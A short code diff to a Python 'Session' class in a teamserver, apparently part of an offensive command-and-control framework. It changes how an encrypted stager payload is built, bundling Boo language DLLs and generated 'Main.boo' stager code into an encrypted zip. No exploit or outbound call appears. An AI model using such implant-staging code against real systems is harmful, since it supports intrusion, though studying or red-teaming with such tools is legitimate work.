@@ -66,12 +66,19 @@ class Session:
 
     def gen_encrypted_stage(self, comms):
         stage = gen_stager_code(comms)
-        with open('./core/teamserver/data/stage.zip', 'rb') as stage_file:
-            stage_file = BytesIO(stage_file.read())
-            with ZipFile(stage_file, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
-                zip_file.writestr("Main.boo", stage)
+        stage_file = BytesIO()
+        with open('./core/teamserver/data/Boo.Lang.dll', 'rb') as boolangdll:
+            with open('./core/teamserver/data/Boo.Lang.Compiler.dll', 'rb') as boolangcompilerdll:
+                with open('./core/teamserver/data/Boo.Lang.Parser.dll', 'rb') as boolangparserdll:
+                    with open('./core/teamserver/data/Boo.Lang.Extensions.dll', 'rb') as boolangextensionsdll:
+                        with ZipFile(stage_file, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
+                            zip_file.writestr("Boo.Lang.dll", boolangdll.read())
+                            zip_file.writestr("Boo.Lang.Compiler.dll", boolangcompilerdll.read())
+                            zip_file.writestr("Boo.Lang.Parser.dll", boolangparserdll.read())
+                            zip_file.writestr("Boo.Lang.Extensions.dll", boolangextensionsdll.read())
+                            zip_file.writestr("Main.boo", stage)
 
-            return self.crypto.encrypt(stage_file.getvalue())
+        return self.crypto.encrypt(stage_file.getvalue())
 
     def __str__(self):
         return f"<Session {self._guid}{f' alias: {self._alias}' if self._alias else ''}>"
